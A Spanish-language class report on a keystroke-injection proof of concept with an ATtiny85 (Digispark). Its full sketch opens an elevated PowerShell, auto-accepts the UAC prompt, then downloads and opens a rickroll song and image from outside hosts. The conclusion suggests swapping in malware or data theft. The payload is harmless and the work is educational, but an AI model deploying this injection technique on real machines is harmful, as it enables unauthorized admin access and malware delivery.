# Reporte de Prueba de Concepto en ATtiny85
En este reporte se describirá el proceso de creación e implementación de una PoC, así como la
preparación del entorno de Arduino para codificar en la Attiny85.

## Conceptos previos

### ¿Qué es una PoC?
Se trata de un mini proyecto que pretende describir la viabilidad de una idea y/u proceso. Valida si un concepto
puede funcionar en la práctica, antes de meterle muchos recursos a ello. Algunos puntos principales
de las PoC son:
* No se trata de crear un producto final, sino probar una idea.
* Es económico de realizar
* Es el primer paso antes de desarrollar un proyecto grande.

En este contexto, una PoC se puede aplicar en cualquie ámbito ya sea empresarial o tecnológico.
Para el enfoque de esta materia, referimos PoC a una prueba de software preliminar que busca probar las capacidades
de un programa o sistema mediante diversos enfoques. <sub>Se trata de un hackeo...pero no lo digan así
frente a otros profesionistas...</sub>

### ¿Qué es una Attiny85?
Se trata de un microcontrolador de 8 bits de la empresa *Microchip Technology*. Es un chip de la familia de los
*AVR*, que son dispositivos de bajo consumo energético y diminuto tamaño.

![image](https://github.com/user-attachments/assets/a46ecec3-a443-49e0-bf8b-49bbe3ebbdfa)

Algunos de sus usos comunes son:
* Electónica básica y avanzada
* Control de LED's
* Pequeñas máquinas automatizadas. <sub>Osea robots...</sub>
* Proyectos de IoT
* Dispositivos *wearables*

A pesar de tener capacidades limitadas en general, es un dispositivo fácil de usar. Sobre todo si se trata de el modelo
con USB integrado.

## Preparando el entorno de la ATtiny85
Como se ha mencionado antes, nuestro microcontrolador se le puede cargar código desde el *Arduino IDE* usado
en todo el mundo para programar microcontroladores de todo tipo, no solamente placas Arduino.

![image](https://github.com/user-attachments/assets/bb6e4746-b957-4b71-94d3-15371cc15bee)

La instalación del IDE es bastante trivial; descargar el instalador, ejecutarlo y bum se instala el compilador... Sin embargo,
el proceso de instalación del entorno se tornó un tanto tediosa...

Verá... Al momento de instalar las librerias y recursos necesarios para utilizar cualquier tipo de placa,
incluido las Arduino, se debe buscar dentro de una libreria de *Boards* compatible con su microcontrolador
respectivo.

![1](https://github.com/user-attachments/assets/b7e7b364-4626-434f-97f0-eab5c7c999a3)

EL IDE de Arduino ya tiene varios *json* de librerias e información y recusrsos de placas necesarios para establecer comunicación
y poder monitorear su actividad, cargar código, etc. Los recursos de la ATtiny **NO** no están integrados así, por lo que hay que cargarlos.

La página web oficial de estos recursos es la de **Digispark**, sin embargo nos encontramos con una sorpresa; acceder al sitio de forma directa
existe un rechazo de la conexión por parte del sitio web...

Existen miles de guías que se basan en el *json* de esta página...Pero también hay un github donde están los recursos!

![image](https://github.com/user-attachments/assets/34196b78-3201-4a9f-948e-3b2fab9c76da)

Ahora no es necesario descargar los recursos desde Ardui-

![image](https://github.com/user-attachments/assets/7895f89e-88f5-4da8-a9a0-892df0f9ade2)

Nop, también el github está roto...

Después de buscar horas y horas afortunadamente pude encontrar otro repositorio con los recusrsos necesarios
y no hacer la instalación de forma manual, pues por alguna razón los recursos no eran detectados o venian
incompletos. El bendito *json* es [este](https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json).

Solo basta con copiar el link del *json* a la sección dentro de *Arduino IDE* **File** -> **Preferences** y en la parte
de **Additional Board Manager URLs** se pega el link del *json*:

![image](https://github.com/user-attachments/assets/427acde7-46fb-417c-b376-924a465e7ba9)

Ahora si está disponible la placa necesaria para tener comunicación y carga de código.

##Creación de PoC

Ésta PoC será sencilla; crea un programa que abra powershell y que descargue archivos de la red hacia el escritorio de la PC y después abrirlos. AL principio tenía algo más grande en mente, pero ya verán a lo que me refiero...

La librería `DigiKeyboard.h` nos permite simular tecleos por medio de la interfaz HID del sistema. Prácticamente haremos una commputadora que escriba comandos cuando nadie este tecleando.

Cada vez que se escriba código por buena práctica se pondran *delays* entre cada comando; pues si se ejecutan comandos cuando algún proceso crucial no halla terminado, estaremos en problemas. Algunos de estos ejemplos es:

`DigiKeyboard.delay(3000);`

Para simular las presiones de teclas usamos la siguiente función:

`DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);`

Aquí puede apreciar que ya hay teclas definidas en el mismo `DigiKeyboard.h` para facilitar la compresión del código. La línea anterior simula presionar el atajo de windows para el cuadro de *run*.

![image](https://github.com/user-attachments/assets/a60f92b8-b400-4a66-8c20-30f1267ffb89)


Necesitaremos descargar una imagen de internet y una canción, y lo haremos mediante de comandos de powershell. Para ello necesitamos invocar el cuadro de powershell:

`DigiKeyboard.println(F("powershell Start-Process powershell -Verb runAs"));`
`DigiKeyboard.delay(2000);`

![image](https://github.com/user-attachments/assets/52488c53-a6bd-4631-b7eb-9408939dbf14)

Después se le dice que *sí* para ejecutar como administrador y nos trae a la ventana de Powershell. Ahora si descargamos los archivos con el comando `Invoke-WebRequest`:
```
DigiKeyboard.println(F("Invoke-WebRequest -Uri 'https://files.ceenaija.com/wp-content/uploads/music/2023/07/Rick_Astley_-_Never_Gonna_Give_You_Up_CeeNaija.com_.mp3' -OutFile \"$env:UserProfile\\desktop\\never_gonna_give_you_up.mp3\""));
DigiKeyboard.delay(10000);

DigiKeyboard.println(F("Invoke-WebRequest -Uri 'https://static1.srcdn.com/wordpress/wp-content/uploads/2020/04/Rickroll-Wide.jpg' -OutFile \"$env:UserProfile\\desktop\\lol.jpg\""));
DigiKeyboard.delay(500);
```

Finalmente debemos abrir ambos archivos. Para ello el comando `Start-Process` es necesario junto con la ruta de los archivos:
```
DigiKeyboard.println(F("Start-Process \"$env:UserProfile\\desktop\\never_gonna_give_you_up.mp3\""));
DigiKeyboard.delay(500);

DigiKeyboard.println(F("Start-Process \"$env:UserProfile\\desktop\\lol.jpg\""));
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_F11);
DigiKeyboard.delay(500);
```
La función con `KEY_F11` es para poner la imagen en pantalla completa.
Como observan todos los recursos viene directo de la web, sin necesidad de abrir ningún navegador u cualquier otra aplicación.Con solo insertar la ATtiny85 a la computadora, todo se hace en automático.

![image](https://github.com/user-attachments/assets/f1b8ca9b-6cc8-4f9c-8e46-38dfbab3560e)

![image](https://github.com/user-attachments/assets/9ff68662-da05-4237-aa7d-629f6dce07a2)

![image](https://github.com/user-attachments/assets/192fc02c-fda5-435b-8fcf-3bd0c23077c1)

Sin embargo existen un par de limitaciones:
1. EL teclado de la computadora debe estar en **Inglés(Estados Unidos)**, pues de no ser así el powershell no se ejecutará adecuadamente y se cerrará instantáneamente.
2. Si la computadora no tiene internet, los recursos no se pueden descargar.

Aqui dejo el código completo:

```
#include "DigiKeyboard.h"

void setup() {
    pinMode(1, OUTPUT); // LED en modelo A
}

void loop() {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(3000);

    // Abrir "Ejecutar"
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);

    // Escribir el comando para abrir PowerShell como administrador
    DigiKeyboard.println(F("powershell Start-Process powershell -Verb runAs"));
    DigiKeyboard.delay(2000);

    // Enviar la tecla "Enter" para confirmar el UAC (si es necesario)
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000);

    // Descargar la canción
    DigiKeyboard.println(F("Invoke-WebRequest -Uri 'https://files.ceenaija.com/wp-content/uploads/music/2023/07/Rick_Astley_-_Never_Gonna_Give_You_Up_CeeNaija.com_.mp3' -OutFile \"$env:UserProfile\\desktop\\never_gonna_give_you_up.mp3\""));
    DigiKeyboard.delay(10000); // Dar más tiempo para la descarga (10 segundos)

    // Descargar la imagen
    DigiKeyboard.println(F("Invoke-WebRequest -Uri 'https://static1.srcdn.com/wordpress/wp-content/uploads/2020/04/Rickroll-Wide.jpg' -OutFile \"$env:UserProfile\\desktop\\lol.jpg\""));
    DigiKeyboard.delay(5000); // Dar más tiempo para la descarga

    // Reproducir la canción
    DigiKeyboard.println(F("Start-Process \"$env:UserProfile\\desktop\\never_gonna_give_you_up.mp3\""));
    DigiKeyboard.delay(500);

    // Abrir la imagen en pantalla completa
    DigiKeyboard.println(F("Start-Process \"$env:UserProfile\\desktop\\lol.jpg\""));
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_F11);
    DigiKeyboard.delay(500);
    
    // Enciende el LED para indicar que terminó
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(3000);
    digitalWrite(1, LOW);

    while (1); // Detiene el loop
}
```
##Conclusiones

Imagine usted que en lugar de una canción o una imagen, el archivo a descargar y ejecutar sea un malware que destruya una computadora
desde dentro en segundos, o que contenga un programa que tome datos de tu computadora y los envie a mi correo...Estas aplicaciones son vitales a la hora de crear soluciones ante amenazas.

Había comentado que tenía algo en mente un poco más complejo que era cambiar el fondo de pantalla. Suena como una tarea tan sencilla como abrir la imagen, pero estuve horas debbugeando y no pude encontrar la forma de hacerlo, pues aún cambiando el registro del sistema en el apartado *WallPaper* la ruta de la imagen estaba aplicada pero por alguna razón no se cambiaba el fondo de pantalla. Debe ser alguna medida de seguridad por parte del windows que no permite eso, y por estos tipos de PoC se pueden pensar en nuevas formas de romper sistemas, así como
cúal sería su solución.


